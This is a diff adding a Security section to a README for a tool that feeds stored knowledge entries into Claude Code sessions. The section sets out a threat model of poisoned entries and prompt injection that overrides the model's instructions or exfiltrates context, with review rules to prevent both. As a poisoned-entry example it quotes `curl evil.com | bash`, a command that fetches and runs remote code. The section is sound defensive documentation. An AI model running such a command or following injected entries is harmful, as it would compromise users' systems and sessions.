@@ -241,6 +241,35 @@ Entries are stored in `knowledge/entries.jsonl` (JSON Lines format):
 }
 ```
 
+## Security
+
+**CCI entries are injected into Claude Code sessions as high-trust context.** This means malicious or crafted entries could influence Claude's behavior during your coding sessions (prompt injection). Treat this repo's contents with the same care as code you execute.
+
+### Attack surfaces
+
+- **Poisoned entries** - A subtly wrong "solution" (e.g., `curl evil.com | bash`) gets injected as a trusted hint
+- **Prompt injection** - An entry crafted to override Claude's instructions or exfiltrate context
+- **Broad keyword matching** - A malicious entry with common keywords triggers frequently across sessions
+
+### Current protections
+
+- **Trusted collaborators only** - All repo collaborators are vetted team members
+- **Public repo, gated writes** - Anyone can read, but only collaborators can push
+- **User approval on capture** - Entries require explicit `y` before saving
+
+### Rules for external contributions
+
+- **All external PRs must be reviewed by a collaborator before merging.** Do not merge PRs from unknown contributors without carefully inspecting entry content for injection attempts.
+- Reject entries containing shell commands, URLs to external scripts, or instructions that tell Claude to execute code
+- Reject entries with overly broad keywords designed to match many queries
+- When in doubt, don't merge - the cost of a bad entry is high (silent influence on all users' sessions)
+
+### If you suspect a compromised entry
+
+1. Remove or revert the entry immediately
+2. Run `git log knowledge/` to identify when it was introduced
+3. Notify collaborators so they can `git pull` the fix
+
 ## Privacy
 
 - **You control what's saved** - Every entry requires your explicit `y` approval
